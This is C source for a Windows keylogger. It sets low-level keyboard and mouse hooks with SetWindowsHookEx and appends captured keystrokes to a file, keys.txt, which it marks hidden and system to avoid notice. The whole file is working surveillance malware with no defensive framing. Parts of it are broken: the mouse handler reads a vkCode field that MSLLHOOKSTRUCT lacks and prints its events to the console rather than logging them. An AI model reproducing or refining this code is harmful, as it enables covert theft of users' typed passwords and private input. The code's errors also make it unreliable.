#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
            int virkey = kbd->vkCode;
            FILE* logfile = fopen("keys.txt", "a");
            SetFileAttributesA("keys.txt", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            switch (virkey) {
                case VK_LCONTROL:
                case VK_RCONTROL:
                    fprintf(logfile, "{control}"); break;
                case VK_LMENU:
                case VK_RMENU:
                    fprintf(logfile, "{alt}"); break;
                case VK_LSHIFT:
                case VK_RSHIFT:
                    fprintf(logfile, "{shift}"); break;
                case VK_RETURN:
                    fprintf(logfile, "{enter}"); break;
                default:
                    if (virkey >= 0x30 && virkey <= 0x5A) {
                        fprintf(logfile, "%c", virkey);
                    }
            }
            fclose(logfile);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lParam;
		int virkey2 = ms->vkCode;
		FILE* logfile = fopen("keys.txt", "a");
		SetFileAttributesA("keys.txt", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        switch (wParam) {
            case WM_LBUTTONDOWN:
                printf("{Mouse: Left Button Down at (%ld, %ld)}\n", ms->pt.x, ms->pt.y);
                break;
            case WM_RBUTTONDOWN:
                printf("{Mouse: Right Button Down at (%ld, %ld)}\n", ms->pt.x, ms->pt.y);
                break;
            case WM_MOUSEMOVE:
                printf("{Mouse: Move at (%ld, %ld)}\n", ms->pt.x, ms->pt.y);
                break;
            case WM_MOUSEWHEEL:
                printf("{Mouse: Wheel Scroll}\n");
                break;
        }
        fclose(logfile);
    }
    return CallNextHookEx(NULL , nCode, wParam, lParam);
}

int WinMain(HINSTANCE hIntance, HINSTANCE hPrevInstance, LPSTR cmdline, int show) {
    SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(NULL), 0);
    SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);

    MSG msg = { 0 };

    while (GetMessage(&msg, NULL, 0, 0)) {}

    return 0;
}
